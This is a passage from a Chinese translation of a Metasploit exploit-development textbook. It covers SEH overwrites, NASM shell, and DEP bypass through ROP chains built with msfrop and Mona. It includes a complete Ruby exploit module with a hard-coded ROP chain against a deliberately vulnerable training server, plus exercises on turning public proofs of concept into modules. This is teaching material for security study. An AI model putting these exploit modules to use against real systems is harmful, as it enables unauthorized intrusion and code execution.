  weapon << make_nops(19) 
  weapon << payload.encoded 
  weapon << " HTTP/1.0rnrn" 
  sock.put(weapon) 
  handler 
  disconnect 
  end 
end 
```

`exploit`函数首先通过连接到目标开始。接下来，它通过在`HEAD`请求中附加`4061`个 NOP 生成一个恶意的`HEAD`请求。接下来，`generate_seh_record()`函数生成一个`8`字节的`SEH`记录，其中前 4 个字节形成了跳转到有效载荷的指令。通常，这 4 个字节包含诸如`\xeb\x0A\x90\x90`的指令，其中`\xeb`表示跳转指令，`\x0A`表示要跳转的`12`字节，而`\x90\x90 NOP`指令则作为填充完成了 4 个字节。

# 使用 NASM shell 编写汇编指令

Metasploit 提供了一个使用 NASM shell 编写短汇编代码的绝佳工具。在上一节中，我们编写了一个小的汇编代码`\xeb\x0a`，它表示了一个 12 字节的短跳转。然而，在消除了搜索互联网或切换汇编操作码的使用后，我们可以使用 NASM shell 轻松编写汇编代码。

在前面的示例中，我们有一个简单的汇编调用，即`JMP SHORT 12`。然而，我们不知道与此指令匹配的操作码是什么。因此，让我们使用 NASM shell 来找出，如下所示：

![](img/6f8fe2cf-7991-429b-aaeb-734accd15ea4.png)

在前面的屏幕截图中，我们可以看到我们从`/usr/share/Metasploit-framework/tools/exploit`目录中启动了`nasm_shell.rb`，然后简单地输入了生成相同操作码`EB0A`的命令，这是我们之前讨论过的。因此，我们可以在所有即将到来的利用示例和实际练习中使用 NASM shell，以减少工作量并节省大量时间。

回到主题，Metasploit 允许我们跳过提供跳转指令和字节数到有效载荷的任务，使用`generate_seh_record()`函数。接下来，我们只需在有效载荷之前提供一些填充以克服任何不规则性，并跟随有效载荷。最后，我们在头部使用`HTTP/1.0\r\n\r\n`完成请求。最后，我们将存储在变量 weapon 中的数据发送到目标，并调用处理程序方法来检查尝试是否成功，并且我们获得了对目标的访问权限。

让我们尝试运行模块并分析行为，如下所示：

![](img/76cda35c-2294-4901-9ef5-29553e382704.png)

让我们为模块设置所有必需的选项，并运行`exploit`命令：

![](img/6617dc64-4149-4132-8cee-8ddf1250432f.png)

砰！我们成功地利用了目标，这是一个 Windows 7 系统。我们看到了在 Metasploit 中创建 SEH 模块是多么容易。在下一节中，我们将深入研究绕过 DEP 等安全机制的高级模块。

有关 SEH mixin 的更多信息，请参阅[`github.com/rapid7/metasploit-framework/wiki/How-to-use-the-Seh-mixin-to-exploit-an-exception-handler`](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-the-Seh-mixin-to-exploit-an-exception-handler)。

# 绕过 Metasploit 模块中的 DEP

**数据执行防护**（**DEP**）是一种保护机制，它将特定内存区域标记为不可执行，导致在利用时不执行 shellcode。因此，即使我们可以覆盖 EIP 寄存器并将 ESP 指向 shellcode 的起始位置，我们也无法执行我们的有效载荷。这是因为 DEP 防止在内存的可写区域（如堆栈和堆）中执行数据。在这种情况下，我们需要使用可执行区域中的现有指令来实现所需的功能。我们可以通过将所有可执行指令按照一定顺序排列，使得跳转到 shellcode 成为可能。

绕过 DEP 的技术称为**返回导向编程**（**ROP**）。ROP 与普通的堆栈溢出不同，普通的堆栈溢出只需要覆盖 EIP 并调用跳转到 shellcode。当 DEP 启用时，我们无法这样做，因为堆栈中的数据是不可执行的。在这里，我们将调用第一个 ROP 小工具，而不是跳转到 shellcode，这些小工具应该被设置成这样的结构，它们形成一个链接结构，其中一个小工具返回到下一个小工具，而不会执行任何来自堆栈的代码。

在接下来的部分中，我们将看到如何找到 ROP 小工具，这些指令可以执行寄存器上的操作，然后返回（`RET`）指令。找到 ROP 小工具的最佳方法是在加载的模块（DLL）中寻找它们。这些小工具的组合形成了一个链式结构，从堆栈中依次取出一个地址并返回到下一个地址，这些链式结构被称为 ROP 链。

我们有一个易受堆栈溢出攻击的示例应用程序。用于覆盖 EIP 的偏移值为 2006。让我们看看当我们使用 Metasploit 利用这个应用程序时会发生什么：

![](img/a8257a82-1559-485b-81b8-51473cb4d7e4.png)

我们可以看到我们轻松地获得了一个 Meterpreter shell。让我们通过从系统属性中导航到高级系统属性来在 Windows 中启用 DEP，如下所示：

![](img/1fd448d5-a14e-40ed-8c4d-4bdb79ffa9e7.png)

我们通过选择对所有程序和服务启用 DEP，除了我选择的那些，来启用 DEP。让我们重新启动系统，并尝试利用相同的漏洞，如下所示：

![](img/d19ebd28-fd05-4b24-af6a-2ef5a65a4d5d.png)

我们可以看到我们的利用失败了，因为 shellcode 没有被执行。

您可以从以下网址下载示例应用程序：[`www.thegreycorner.com/2010/12/introducing-vulnserver.html`](http://www.thegreycorner.com/2010/12/introducing-vulnserver.html)。

在接下来的部分中，我们将看到如何使用 Metasploit 绕过 DEP 的限制，并访问受保护的系统。让我们保持 DEP 启用，将相同的易受攻击的应用程序附加到调试器，并检查其可执行模块，如下所示：

![](img/df7cc20b-64f2-411f-8dac-997886a437c8.png)

使用 Mona 脚本，就像我们之前做的那样，我们可以使用`!mona modules`命令找到所有模块的信息。然而，要构建 ROP 链，我们需要在这些 DLL 文件中找到所有可执行的 ROP 小工具。

# 使用 msfrop 查找 ROP 小工具

Metasploit 提供了一个非常方便的工具来查找 ROP 小工具：`msfrop`。它不仅使我们能够列出所有的 ROP 小工具，还允许我们通过这些小工具来寻找我们所需操作的适当小工具。假设我们需要查看所有可以帮助我们执行对`ECX`寄存器的弹出操作的小工具。我们可以使用`msfrop`来做到这一点，如下所示：

![](img/b26f0e56-3daf-4848-a42b-0e3289dfe707.png)

只要我们为搜索提供了`-s`开关，并为详细输出提供了`-v`，我们就开始获得所有使用 POP ECX 指令的小工具的列表。让我们看看结果：

![](img/cae599b6-1754-4486-915b-d67b673fecec.png)

我们可以看到，我们有各种各样的小工具可以轻松执行 POP ECX 任务。然而，要构建一个成功的 Metasploit 模块，可以在 DEP 存在的情况下利用目标应用程序，我们需要开发一系列这些 ROP 小工具，而不执行任何来自堆栈的内容。让我们通过以下图表了解 DEP 的 ROP 绕过：

![](img/9ae8c704-8223-47e1-a1a1-8414361dc207.png)

在左侧，我们有一个标准应用程序的布局。在中间，我们有一个使用缓冲区溢出漏洞受到攻击的应用程序，导致 EIP 寄存器被覆盖。在右侧，我们有 DEP 绕过的机制，我们不是用 JMP ESP 地址覆盖 EIP，而是用 ROP gadget 的地址覆盖它，然后是另一个 ROP gadget，依此类推，直到执行 shellcode。

指令执行如何绕过硬件启用的 DEP 保护？

答案很简单。诀窍在于将这些 ROP gadgets 链接起来调用`VirtualProtect()`函数，这是一个用于使堆栈可执行的内存保护函数，以便 shellcode 可以执行。让我们看看我们需要执行哪些步骤才能使利用在 DEP 保护下工作：

1.  找到 EIP 寄存器的偏移量

1.  用第一个 ROP gadget 覆盖寄存器

1.  继续用其余的 gadgets 覆盖，直到 shellcode 变得可执行

1.  执行 shellcode

# 使用 Mona 创建 ROP 链

使用 Immunity Debugger 的 Mona 脚本，我们可以找到 ROP gadgets。然而，它还提供了自己创建整个 ROP 链的功能，如下图所示：

![](img/488269bb-b3c7-4609-b3de-0c7cbb5f008a.png)

在 Immunity Debugger 的控制台中使用`!mona rop -m *.dll -cp nonull`命令，我们可以找到关于 ROP gadgets 的所有相关信息。我们可以看到 Mona 脚本生成了以下文件：

![](img/fb4f21a9-c0ad-43e5-99dd-cdeb145d080b.png)

有趣的是，我们有一个名为`rop_chains.txt`的文件，其中包含可以直接在利用模块中使用的整个链。该文件包含了在 Python、C 和 Ruby 中创建的用于 Metasploit 的 ROP 链。我们只需要将 ROP 链复制到我们的利用中，就可以了。

为触发`VirtualProtect()`函数创建 ROP 链，我们需要以下寄存器的设置：

![](img/a949b3aa-4cb1-4243-99c3-5745db324264.png)

让我们看一下 Mona 脚本创建的 ROP 链，如下所示：

![](img/80399eaa-788b-46d3-9749-d46e0614de54.png)

我们在`rop_chains.txt`文件中有一个完整的`create_rop_chain`函数，用于 Metasploit。我们只需要将这个函数复制到我们的利用中。

# 编写 DEP 绕过的 Metasploit 利用模块

在这一部分，我们将为同一个易受攻击的应用程序编写 DEP 绕过利用，我们在利用栈溢出漏洞时失败了，因为 DEP 已启用。该应用程序在 TCP 端口`9999`上运行。因此，让我们快速构建一个模块，并尝试在同一应用程序上绕过 DEP：

```
class MetasploitModule < Msf::Exploit::Remote 
  Rank = NormalRanking 

  include Msf::Exploit::Remote::Tcp 

  def initialize(info = {}) 
    super(update_info(info, 
      'Name'                 => 'DEP Bypass Exploit', 
      'Description'    => %q{ 
         DEP Bypass Using ROP Chains Example Module 
      }, 
      'Platform'             => 'win', 
      'Author'         => 
        [ 
          'Nipun Jaswal' 
        ], 
      'Payload' => 
      { 
      'space' => 312, 
      'BadChars' => "\x00", 
      }, 
      'Targets' => 
       [ 
                  ['Windows 7 Professional',{ 'Offset' => 2006}] 
       ], 
      'DisclosureDate' => 'Mar 4 2018' 
   )) 
   register_options( 
   [ 
         Opt::RPORT(9999) 
   ]) 
  end 
```

我们已经编写了许多模块，并对所需的库和初始化部分非常熟悉。此外，我们不需要返回地址，因为我们使用的是自动构建机制跳转到 shellcode 的 ROP 链。让我们专注于利用部分：

```
def create_rop_chain() 

    # rop chain generated with mona.py - www.corelan.be 
    rop_gadgets =  
    [ 
      0x77dfb7e4,  # POP ECX # RETN [RPCRT4.dll]  
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll] 
      0x76a5fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll]  
      0x766a70d7,  # POP EBP # RETN [USP10.dll]  
      0x625011bb,  # & jmp esp [essfunc.dll] 
      0x777f557c,  # POP EAX # RETN [msvcrt.dll]  
      0xfffffdff,  # Value to negate, will become 0x00000201 
      0x765e4802,  # NEG EAX # RETN [user32.dll]  
      0x76a5f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll]  
      0x7779f5d4,  # POP EAX # RETN [msvcrt.dll]  
      0xffffffc0,  # Value to negate, will become 0x00000040 
      0x765e4802,  # NEG EAX # RETN [user32.dll]  
      0x76386fc0,  # XCHG EAX,EDX # RETN [kernel32.dll]  
      0x77dfd09c,  # POP ECX # RETN [RPCRT4.dll]  
      0x62504dfc,  # &Writable location [essfunc.dll] 
      0x77e461e1,  # POP EDI # RETN [RPCRT4.dll]  
      0x765e4804,  # RETN (ROP NOP) [user32.dll] 
      0x777f3836,  # POP EAX # RETN [msvcrt.dll]  
      0x90909090,  # nop 
      0x77d43c64,  # PUSHAD # RETN [ntdll.dll]  
    ].flatten.pack("V*") 

    return rop_gadgets 

  end 
  def exploit 
    connect 
    rop_chain = create_rop_chain() 
    junk = rand_text_alpha_upper(target['Offset']) 
    buf = "TRUN ."+junk + rop_chain  + make_nops(16) + payload.encoded+'rn' 
    sock.put(buf) 
    handler 
    disconnect 
  end 
end 
```

我们可以看到，我们将 Mona 脚本生成的`rop_chains.txt`文件中的整个`create_rop_chain`函数复制到了我们的利用中。

我们通过连接到目标开始利用方法。然后，我们调用`create_rop_chain`函数，并将整个链存储在一个名为`rop_chain`的变量中。

接下来，我们使用`rand_text_alpha_upper`函数创建一个包含`2006`个字符的随机文本，并将其存储在一个名为`junk`的变量中。该应用程序的漏洞在于执行`TRUN`命令。因此，我们创建一个名为`buf`的新变量，并存储`TRUN`命令，后跟包含`2006`个随机字符的`junk`变量，再跟我们的`rop_chain`。我们还添加了一些填充，最后将 shellcode 添加到`buf`变量中。

接下来，我们只需将`buf`变量放到通信通道`sock.put`方法中。最后，我们只需调用处理程序来检查是否成功利用。

让我们运行这个模块，看看我们是否能够利用系统：

![](img/671993e2-7b00-4d79-b1ab-68672df8b82b.png)

哇！我们轻松地通过了 DEP 保护。现在我们可以对受损目标进行后期利用。

# 其他保护机制

在本章中，我们基于基于堆栈的漏洞开发了利用程序，在我们的利用过程中，我们绕过了 SEH 和 DEP 保护机制。还有许多其他保护技术，如地址空间布局随机化（ASLR）、堆栈 cookie、SafeSEH、SEHOP 等。我们将在本书的后续部分中看到这些技术的绕过技术。然而，这些技术将需要对汇编、操作码和调试有出色的理解。

参考一篇关于绕过保护机制的优秀教程：[`www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/`](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)。

有关调试的更多信息，请参考：[`resources.infosecinstitute.com/debugging-fundamentals-for-exploit-development/`](http://resources.infosecinstitute.com/debugging-fundamentals-for-exploit-development/)。

# 总结

在本章中，我们首先介绍了在 Metasploit 中编写利用程序的汇编基础知识，一般概念以及它们在利用中的重要性。我们深入讨论了基于堆栈的溢出、基于 SEH 的堆栈溢出以及绕过 DEP 等保护机制的细节。我们还介绍了 Metasploit 中各种方便的工具，以帮助利用过程。我们还看了坏字符和空间限制的重要性。

现在，我们可以借助支持工具执行诸如在 Metasploit 中编写软件的利用之类的任务，确定必要的寄存器，覆盖它们的方法，并打败复杂的保护机制。

在进行下一章之前，可以尝试完成以下一组练习：

+   尝试在 exploit-db.com 上找到仅适用于 Windows XP 系统的利用程序，并使其在 Windows 7/8/8.1 上可用

+   从[`exploit-db.com/`](https://exploit-db.com/)中至少获取 3 个 POC 利用程序，并将它们转换为完全可用的 Metasploit 利用模块

+   开始向 Metasploit 的 GitHub 存储库做出贡献，并 fork 主要实例

在下一章中，我们将查看目前在 Metasploit 中尚不可用的公开可用的利用程序。我们将尝试将它们移植到 Metasploit 框架中。
